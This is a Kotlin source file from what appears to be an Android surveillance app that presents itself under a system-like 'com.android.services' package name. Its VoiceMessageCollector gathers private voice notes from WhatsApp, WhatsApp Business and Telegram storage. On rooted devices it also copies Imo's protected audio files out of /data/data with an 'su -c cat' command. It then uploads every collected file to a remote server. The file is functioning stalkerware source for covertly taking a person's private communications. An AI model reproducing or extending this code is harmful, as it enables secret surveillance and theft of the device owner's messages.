package com.android.services.logs.collectors

import android.content.Context
import android.os.Environment
import com.android.services.db.entities.VoiceMessage
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.retrofit.FileUploader
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.DeviceInformationUtil
import com.android.services.util.RootPermission
import com.android.services.util.logException
import com.android.services.util.logVerbose
import com.google.gson.GsonBuilder
import com.google.gson.reflect.TypeToken
import org.json.JSONArray
import java.io.File

class VoiceMessageCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
) : LogsCollector {

    override fun uploadLogs() {
        getWhatsAppBusinessVoiceMessages(context)
        getWhatsAppVoiceMessages(context)
        getImoVoiceMessages(context)
        getTelegramVoiceMessages(context)
        localDatabaseSource.selectVoiceMessageMessages { voiceMessagesList ->
            if (voiceMessagesList.isNotEmpty()) {
                try {
                    val gson = GsonBuilder().create()
                    val mVoiceMessageJSON =
                        JSONArray(
                            gson.toJson(
                                voiceMessagesList,
                                object : TypeToken<List<VoiceMessage>>() {}.type
                            )
                        )
                    val fileUploader =
                        FileUploader(
                            context,
                            AppConstants.VOICE_MESSAGE_TYPE,
                            localDatabaseSource
                        )
                    for (i in 0 until mVoiceMessageJSON.length()) {
                        try {
                            fileUploader.uploadFile(mVoiceMessageJSON.getJSONObject(i))
                        } catch (e: Exception) {
                            logException(e.message!!, AppConstants.VOICE_MESSAGE_TYPE, e)
                        }
                    }
                } catch (e: Exception) {
                    AppUtils.appendLog(
                        context,
                        "${AppConstants.VOICE_MESSAGE_TYPE} ${e.message}"
                    )
                    logException(e.message!!, AppConstants.VOICE_MESSAGE_TYPE, e)
                }
            } else {
                logVerbose(
                    "${AppConstants.VOICE_MESSAGE_TYPE} No VoiceMessages found",
                    AppConstants.VOICE_MESSAGE_TYPE
                )
            }
        }
    }

    private fun getWhatsAppBusinessVoiceMessages(context: Context) {
        val voiceMessages: MutableList<VoiceMessage> = ArrayList()
        var path = Environment.getExternalStorageDirectory()
            .toString() + "/WhatsApp Business/Media/WhatsApp Business Voice Notes/"
        var file = File(path)
        if (!file.exists()) {
            path = Environment.getExternalStorageDirectory().toString() +
                    "/Android/Media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Business Voice Notes/"
            file = File(path)
        }

        var maxTimeStamp: Long? =
            localDatabaseSource.selectMaxVoiceMessageTimeStamp("WhatsApp Business")
        if (maxTimeStamp == null) maxTimeStamp = 0L
        if (file.exists()) {
            try {
                val files: List<String> = AppUtils.getFilesListInDirectory(file)
                for (i in files.indices) {
                    val filePath = path + files[i]
                    val pathFile = File(filePath)
                    if (pathFile.isDirectory) {
                        val internalPath = "$filePath/"
                        val internalFiles = File(internalPath)
                        val dirTime = internalFiles.lastModified()
                        if (dirTime > maxTimeStamp) {
                            val voiceFiles: List<String> =
                                AppUtils.getFilesListInDirectory(internalFiles)
                            for (v in voiceFiles.indices) {
                                val voiceFilePath = internalPath + voiceFiles[v]
                                val file1 = File(voiceFilePath)
                                val timeStamp = file1.lastModified().toString()
                                if (timeStamp.toLong() > maxTimeStamp) {
                                    if (!voiceFilePath.contains(".nomedia")) {
                                        val voiceMessage = VoiceMessage()
                                        voiceMessage.file = voiceFilePath
                                        voiceMessage.fileName = file1.name
                                        voiceMessage.appName = "WhatsApp Business"
                                        voiceMessage.dateTaken = AppUtils.formatDate(timeStamp)
                                        voiceMessage.timeStamp = timeStamp.toLong()
                                        voiceMessage.date = AppUtils.getDate(timeStamp.toLong())
                                        voiceMessage.status = 0
                                        voiceMessages.add(voiceMessage)
                                    }
                                }
                            }
                        }
                    }
                }
                if (voiceMessages.size > 0) localDatabaseSource.insertVoiceMessage(voiceMessages)
            } catch (e: Exception) {
                logVerbose(AppConstants.VOICE_MESSAGE_TYPE + " whatsApp Error:- " + e.message)
            }
        }
    }

    private fun getWhatsAppVoiceMessages(context: Context) {
        val voiceMessages: MutableList<VoiceMessage> = ArrayList()
//        var path = Environment.getExternalStorageDirectory()
//            .toString() + "/WhatsApp/Media/WhatsApp Voice Notes/"
//        var file = File(path)
//        if (!file.exists()) {
//            path = Environment.getExternalStorageDirectory().toString() +
//                    "/Android/Media/com.whatsapp/WhatsApp/Media/WhatsApp Voice Notes/"
//            file = File(path)
//        }
//
        val path = getWhatsAppVoiceMessagesPath(context)
        val file = File(path)
        var maxTimeStamp: Long? = localDatabaseSource.selectMaxVoiceMessageTimeStamp("whatsApp")
        if (maxTimeStamp == null) maxTimeStamp = 0L
        if (file.exists()) {
            try {
                val files: List<String> = AppUtils.getFilesListInDirectory(file)
                for (i in files.indices) {
                    val filePath = path + files[i]
                    val pathFile = File(filePath)
                    if (pathFile.isDirectory) {
                        val internalPath = "$filePath/"
                        val internalFiles = File(internalPath)
                        val dirTime = internalFiles.lastModified()
                        if (dirTime > maxTimeStamp) {
                            val voiceFiles: List<String> =
                                AppUtils.getFilesListInDirectory(internalFiles)
                            for (v in voiceFiles.indices) {
                                val voiceFilePath = internalPath + voiceFiles[v]
                                val file1 = File(voiceFilePath)
                                val timeStamp = file1.lastModified().toString()
                                if (timeStamp.toLong() > maxTimeStamp) {
                                    if (!voiceFilePath.contains(".nomedia")) {
                                        val voiceMessage = VoiceMessage()
                                        voiceMessage.file = voiceFilePath
                                        voiceMessage.fileName = file1.name
                                        voiceMessage.appName = "whatsApp"
                                        voiceMessage.dateTaken = AppUtils.formatDate(timeStamp)
                                        voiceMessage.timeStamp = timeStamp.toLong()
                                        voiceMessage.date = AppUtils.getDate(timeStamp.toLong())
                                        voiceMessage.status = 0
                                        voiceMessages.add(voiceMessage)
                                    }
                                }
                            }
                        }
                    }
                }
                if (voiceMessages.size > 0) localDatabaseSource.insertVoiceMessage(voiceMessages)
            } catch (e: Exception) {
                logVerbose(AppConstants.VOICE_MESSAGE_TYPE + " whatsApp Error:- " + e.message)
            }
        }
    }

    private fun getWhatsAppVoiceMessagesPath(context: Context): String {
        val path1 = Environment.getExternalStorageDirectory()
            .toString() + "/WhatsApp/Media/WhatsApp Voice Notes/"
        val path2 = Environment.getExternalStorageDirectory().toString() +
                "/Android/Media/com.whatsapp/WhatsApp/Media/WhatsApp Voice Notes/"
        val file = File(path1)
        if (!file.exists()) {
            return path2
        } else {
            try {
                val files: List<String> = AppUtils.getFilesListInDirectory(file)
                for (i in files.indices) {
                    val filePath = path1 + files[i]
                    val pathFile = File(filePath)
                    if (files.size == 1 && !pathFile.isDirectory && pathFile.name.contains(".nomedia")) {
                        return path2
                    } else
                        return path1
                }
            } catch (e: Exception) {
                logVerbose(AppConstants.VOICE_MESSAGE_TYPE + " whatsApp Error:- " + e.message)
            }
        }
        return path1
    }

    private fun getTelegramVoiceNotesPath(context: Context): String {
        val path = Environment.getExternalStorageDirectory()
            .toString() + "/Telegram/Telegram Audio/"
//        val path2 = Environment.getExternalStorageDirectory().toString() +
//                "/Android/data/org.telegram.messenger/files/Telegram/Telegram Audio/"
        return if (AppConstants.osGreaterThanEqualToEleven) {
            if (DeviceInformationUtil.isDeviceRooted) {
                AppConstants.TELEGRAM_VOICE_MESSAGE_PATH
            } else {
                path
            }
        } else {
            path
        }
    }

    private fun getImoVoiceMessages(context: Context) {
        if (!DeviceInformationUtil.isDeviceRooted) {
            return
        }
        val voiceMessages: MutableList<VoiceMessage> = ArrayList()
        try {
            val imoFolder = "com.imo.android.imoim"
            RootPermission.setPermissionImoAudio()
            var maxTimeStamp: Long? = localDatabaseSource.selectMaxVoiceMessageTimeStamp("Imo")
            if (maxTimeStamp == null) maxTimeStamp = 0L
            val imoPath = "/data/data/$imoFolder/files/audio/"
            val imoFile = File(imoPath)
            if (imoFile.exists()) {
                try {
                    val files: List<String> = AppUtils.getFilesListInDirectory(imoFile)
                    for (i in files.indices) {
                        val filePath = imoPath + files[i]
                        val iFile = File(filePath)
                        if (iFile.isFile) {
                            val iTime = iFile.lastModified()
                            if (iTime > maxTimeStamp) {
                                val copyFilePath: String = AppUtils.retrieveFilePath(
                                    context,
                                    AppConstants.DIR_VOICE_MESSAGES,
                                    iFile.name
                                )
                                Runtime.getRuntime().exec(
                                    arrayOf(
                                        "su", "-c", "cat "
                                                + filePath
                                                + " > " + copyFilePath
                                    )
                                )
                                val desFile = File(copyFilePath)
                                if (desFile.isFile) {
                                    val voiceMessage = VoiceMessage()
                                    voiceMessage.file = copyFilePath
                                    voiceMessage.fileName = iFile.name
                                    voiceMessage.appName = "Imo"
                                    voiceMessage.dateTaken = AppUtils.formatDate(iTime.toString())
                                    voiceMessage.timeStamp = iTime
                                    voiceMessage.date = AppUtils.getDate(iTime)
                                    voiceMessage.status = 0
                                    voiceMessages.add(voiceMessage)
                                }
                            }
                        }
                    }
                    if (voiceMessages.size > 0) localDatabaseSource.insertVoiceMessage(
                        voiceMessages
                    )
                } catch (e: Exception) {
                    logVerbose(AppConstants.VOICE_MESSAGE_TYPE + " IMO Error:- " + e.message)
                }
            }
        } catch (e: Exception) {
            logVerbose(AppConstants.VOICE_MESSAGE_TYPE + " IMO Error:- " + e.message)
        }
    }

    private fun getTelegramVoiceMessages(context: Context) {
        val voiceMessages: MutableList<VoiceMessage> = ArrayList()
        try {
            val telegramPath = getTelegramVoiceNotesPath(context)
            val telegramFile = File(telegramPath)
            var maxTimeStamp: Long? = localDatabaseSource.selectMaxVoiceMessageTimeStamp("Telegram")
            if (maxTimeStamp == null) maxTimeStamp = 0L
            if (telegramFile.exists()) {
                try {
                    val files: List<String> = AppUtils.getFilesListInDirectory(telegramFile)
                    for (t in files.indices) {
                        val voiceFile = telegramPath + "/" + files[t]
                        val iFile = File(voiceFile)
                        val tTime = iFile.lastModified()
                        val timeStamp = tTime.toString()
                        if (tTime > maxTimeStamp) {
                            if (!voiceFile.contains(".nomedia")) {
                                val voiceMessage = VoiceMessage()
                                voiceMessage.file = voiceFile
                                voiceMessage.fileName = iFile.name
                                voiceMessage.appName = "Telegram"
                                voiceMessage.dateTaken = AppUtils.formatDate(timeStamp)
                                voiceMessage.timeStamp = timeStamp.toLong()
                                voiceMessage.date = AppUtils.getDate(timeStamp.toLong())
                                voiceMessage.status = 0
                                voiceMessages.add(voiceMessage)
                            }
                        }
                    }
                    if (voiceMessages.size > 0) {
                        localDatabaseSource.insertVoiceMessage(voiceMessages)
                    }
                } catch (e: Exception) {
                    logVerbose(AppConstants.VOICE_MESSAGE_TYPE + " Telegram Error:- " + e.message)
                }
            }
        } catch (e: Exception) {
            logVerbose(AppConstants.VOICE_MESSAGE_TYPE + " Telegram Error:- " + e.message)
        }
    }
}